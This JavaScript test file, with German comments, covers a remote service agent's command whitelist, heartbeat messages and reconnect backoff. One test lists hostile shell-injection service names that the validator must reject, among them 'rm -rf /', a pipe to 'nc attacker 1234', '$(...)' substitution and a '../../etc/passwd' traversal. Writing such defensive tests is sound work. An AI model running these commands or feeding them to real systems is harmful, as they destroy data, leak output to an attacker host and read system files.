// Tests fuer die Logik des Arsenal-Agenten.
//
// Der Agent laeuft auf einer FREMDEN Maschine und fuehrt aus, was die Armory
// schickt. Deshalb ist die Befehlspruefung der wichtigste Teil dieses Moduls:
// sie muss ALLES ablehnen, was nicht exakt der Whitelist entspricht.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import {
  ALLOWED_ACTIONS,
  HEARTBEAT_MS,
  IDLE_RECONNECT_MS,
  SERVICE_RE,
  validateCommand,
  heartbeatMessage,
  shouldReconnect,
  nextBackoff,
} from '../agent/logic.js';

// ---------- Befehlspruefung: was DURCH darf ----------

test('die vier erlaubten Aktionen kommen durch', () => {
  for (const action of ['status', 'start', 'stop', 'restart']) {
    const r = validateCommand({ type: 'command', action, service: 'atm11.service' });
    assert.equal(r.ok, true, `${action} wurde abgelehnt`);
    assert.equal(r.action, action);
    assert.equal(r.service, 'atm11.service');
  }
});

test('status ohne Dienst ist erlaubt', () => {
  // "Was laeuft hier" braucht keinen Dienstnamen.
  const r = validateCommand({ type: 'command', action: 'status' });
  assert.equal(r.ok, true);
  assert.equal(r.service, null);
});

test('die Whitelist ist genau diese fünf Aktionen lang', () => {
  // Waechst die Liste unerwartet, faellt es hier auf. Die Liste steht
  // ausgeschrieben und wird nicht gezaehlt: kommt eine Aktion hinzu, steht
  // sie hier im Test - dann ist die Erweiterung eine Entscheidung und kein
  // Versehen.
  assert.deepEqual(
    [...ALLOWED_ACTIONS],
    ['status', 'start', 'stop', 'restart', 'update'],
  );
});

// ---------- Befehlspruefung: was ABGELEHNT wird ----------

test('unbekannte Aktionen werden abgelehnt', () => {
  for (const action of ['enable', 'disable', 'daemon-reload', 'exec', 'rm', '', 'STATUS']) {
    const r = validateCommand({ type: 'command', action, service: 'x.service' });
    assert.equal(r.ok, false, `Aktion ${JSON.stringify(action)} wurde akzeptiert`);
    assert.equal(r.reason, 'bad-action');
  }
});

test('fehlende oder falsche Aktion wird abgelehnt', () => {
  for (const action of [undefined, null, 0, {}, []]) {
    const r = validateCommand({ type: 'command', action, service: 'x.service' });
    assert.equal(r.ok, false);
  }
});

test('Nicht-Befehle werden abgelehnt', () => {
  // Nur type === 'command' darf je zu einer Aktion fuehren.
  for (const msg of [null, undefined, 'start', 42, [], {}]) {
    assert.equal(validateCommand(msg).ok, false, `Nachricht ${JSON.stringify(msg)} akzeptiert`);
  }
  assert.equal(validateCommand({ type: 'heartbeat', action: 'start', service: 'x' }).ok, false);
});

test('Dienstnamen mit Shell-Metazeichen werden abgelehnt', () => {
  // Das ist der Kern: diese Namen duerfen NIE in der Naehe eines Prozessstarts
  // landen. Ein Semikolon, ein Pipe, ein $( ) - alles raus.
  const boese = [
    'atm11; rm -rf /',
    'atm11 && reboot',
    'atm11 | nc attacker 1234',
    '$(touch /tmp/x)',
    '`id`',
    'atm11\nstart',
    'atm11\0stop',
    'atm11 service',
    '../../etc/passwd',
    '/usr/bin/atm11',
    '-rf',
  ];
  for (const service of boese) {
    const r = validateCommand({ type: 'command', action: 'start', service });
    assert.equal(r.ok, false, `Dienst ${JSON.stringify(service)} wurde akzeptiert`);
  }
});

test('SERVICE_RE erlaubt nur harmlose Unit-Namen', () => {
  for (const gut of ['atm11', 'atm11.service', 'team-speak6', 'a@b.service', 'x']) {
    assert.ok(SERVICE_RE.test(gut), `${gut} sollte erlaubt sein`);
  }
  for (const schlecht of ['.atm11', '-atm11', 'atm 11', 'a/b', 'a;b', '', 'x'.repeat(65)]) {
    assert.ok(!SERVICE_RE.test(schlecht), `${schlecht} sollte verboten sein`);
  }
});

test('fehlender Dienst bei start/stop/restart wird abgelehnt', () => {
  for (const action of ['start', 'stop', 'restart']) {
    for (const service of [undefined, null, '', 0]) {
      const r = validateCommand({ type: 'command', action, service });
      assert.equal(r.ok, false, `${action} ohne Dienst akzeptiert`);
    }
  }
});

test('ein Array als Dienst wird abgelehnt, nicht als Liste gelesen', () => {
  // Gefaehrlich waere, wenn ["atm11"] durchkaeme - manche APIs nehmen das an.
  const r = validateCommand({ type: 'command', action: 'stop', service: ['atm11'] });
  assert.equal(r.ok, false);
});

// ---------- Lebenszeichen ----------

test('Lebenszeichen traegt Version und Hostname, gekuerzt', () => {
  const m = heartbeatMessage({ id: 3, version: '1.3.72', hostname: 'armory-test' });
  assert.equal(m.type, 'heartbeat');
  assert.equal(m.id, 3);
  assert.equal(m.version, '1.3.72');
  assert.equal(m.hostname, 'armory-test');
});

test('Lebenszeichen erfindet keine Version', () => {
  const m = heartbeatMessage({ id: 1, version: null, hostname: null });
  assert.equal(m.version, null);
  assert.equal(m.hostname, null);
  assert.ok(!JSON.stringify(m).includes('undefined'));
});

test('zu lange Werte werden gekuerzt statt die Verbindung zu sprengen', () => {
  const m = heartbeatMessage({ id: 1, version: 'v'.repeat(200), hostname: 'h'.repeat(200) });
  assert.equal(m.version.length, 40);
  assert.equal(m.hostname.length, 64);
});

// ---------- Verbindung ----------

test('ohne je empfangene Nachricht muss neu verbunden werden', () => {
  assert.equal(shouldReconnect({ now: Date.now(), lastMessageAt: null }), true);
  assert.equal(shouldReconnect({ now: Date.now(), lastMessageAt: undefined }), true);
  assert.equal(shouldReconnect({ now: Date.now(), lastMessageAt: NaN }), true);
});

test('eine frische Leitung wird nicht neu verbunden', () => {
  const now = 1_700_000_000_000;
  assert.equal(shouldReconnect({ now, lastMessageAt: now - 1000 }), false);
});

test('eine stille Leitung wird nach IDLE_RECONNECT_MS neu verbunden', () => {
  const now = 1_700_000_000_000;
  assert.equal(shouldReconnect({ now, lastMessageAt: now - IDLE_RECONNECT_MS }), false);
  assert.equal(shouldReconnect({ now, lastMessageAt: now - IDLE_RECONNECT_MS - 1 }), true);
});

test('zweimal gemeldet: HEARTBEAT_MS ist deutlich kleiner als die Reconnect-Grenze', () => {
  // Sonst wuerde sich der Agent selbst staendig neu verbinden.
  assert.ok(HEARTBEAT_MS < IDLE_RECONNECT_MS);
});

test('Wartezeit verdoppelt sich und ist gedeckelt', () => {
  assert.equal(nextBackoff(undefined), 2000);
  assert.equal(nextBackoff(1000), 2000);
  assert.equal(nextBackoff(2000), 4000);
  assert.equal(nextBackoff(32000), 60000);
  assert.equal(nextBackoff(60000), 60000);
  // Nie schneller als 1 s: ein Agent, der im Sekundentakt verbindet, legt
  // die Armory lahm.
  assert.ok(nextBackoff(0) >= 1000);
});
